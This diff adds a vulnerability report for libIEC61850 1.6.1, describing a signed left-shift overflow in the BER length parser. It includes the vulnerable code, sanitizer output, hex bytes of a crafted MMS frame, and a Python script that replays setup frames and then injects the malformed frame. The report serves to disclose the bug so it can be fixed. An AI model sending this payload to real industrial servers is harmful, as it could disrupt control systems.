@@ -1,0 +1,94 @@
+issue #590
+
+Summary
+A malformed BER-encoded MMS payload can trigger undefined behavior in libIEC61850 1.6.1 inside ber_fetch_length() when parsing long-form BER lengths.
+
+The parser accumulates the BER length value using repeated signed left shifts:
+
+len = (len << 8) | *buf;
+The bounds check happens after the shift, so a sufficiently large attacker-controlled long-form length can cause signed left-shift overflow before the code notices the value is too large. This is reliably flagged by UndefinedBehaviorSanitizer.
+
+Details
+File: src/mms/iso_mms/asn1c/ber_tlv_length.c, line 43, function ber_fetch_length().
+
+Relevant code:
+
+for(len = 0, buf++, oct--;; buf++, oct--) {
+    if(oct == 0)
+        break;
+    len = (len << 8) | *buf;
+    if(len < 0 || (len >> ((8 * sizeof(len)) - 8) && oct > 1)) {
+        /* Too large length value. */
+        return -1;
+    }
+}
+The bug is that len << 8 is performed before checking whether the intermediate value is representable in ber_tlv_len_t (on this target, long).
+
+A malformed long-form length can therefore drive the parser into undefined behavior before the “too large length value” check executes.
+
+In local testing, UBSan reports:
+
+src/mms/iso_mms/asn1c/ber_tlv_length.c:43:15: runtime error: left shift of 45460131281978319 by 8 places cannot be represented in type 'ber_tlv_len_t' (aka 'long')
+SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior src/mms/iso_mms/asn1c/ber_tlv_length.c:43:15
+This issue is remotely reachable from a malformed MMS/BER payload.
+In one validated test path, the malformed frame was injected over an already established TCP connection and the server still triggered the UBSan report, showing that the vulnerable parser path is reachable after session establishment.
+
+PoC
+
+Validated network PoC stream:
+
+setup frame 1: legal COTP CR
+setup frame 2: session/association setup traffic
+evil frame 3: malformed BER-encoded MMS payload triggering ber_fetch_length()
+The validated “evil” TPKT frame begins with:
+
+03 00 00 e5 02 f0 80 01 00 01 00 61 81 d7 30 81 d4 02 01 03 a0 81 ce a0 81 cb 02 01 23 a4 81 c5 ...
+A practical validation method is to replay the first two setup frames on a fresh TCP connection, keep the connection alive briefly, and then inject the third frame on the same connection.
+
+Example Python sender logic:
+
+import socket
+import sys
+import time
+from pathlib import Path
+
+def split_tpkt(buf: bytes):
+    out = []
+    pos = 0
+    while pos + 4 <= len(buf):
+        ln = int.from_bytes(buf[pos + 2:pos + 4], "big")
+        out.append(buf[pos:pos + ln])
+        pos += ln
+    return out
+
+host = "127.0.0.1"
+port = int(sys.argv[1])
+data = Path("poc_ber_length_overflow.bin").read_bytes()
+frames = split_tpkt(data)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+
+# send setup frames
+s.sendall(frames[0])
+time.sleep(0.2)
+s.sendall(frames[1])
+
+# keep the connection alive
+time.sleep(10)
+
+# inject evil frame on the same connection
+s.sendall(frames[2])
+
+time.sleep(1)
+s.close()
+Run against server_example_basic_io built with UBSan:
+
+python3 poc_ber.py 8102
+Expected server output includes:
+
+Connection opened
+src/mms/iso_mms/asn1c/ber_tlv_length.c:43:15: runtime error: left shift of 45460131281978319 by 8 places cannot be represented in type 'ber_tlv_len_t' (aka 'long')
+SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior src/mms/iso_mms/asn1c/ber_tlv_length.c:43:15
+In current testing, this did not always immediately tear down the TCP connection; in some runs the server returned an error-like protocol response and kept the socket open.
+Therefore, the present evidence supports “remote parser UB” more strongly than “definite connection-level DoS”.
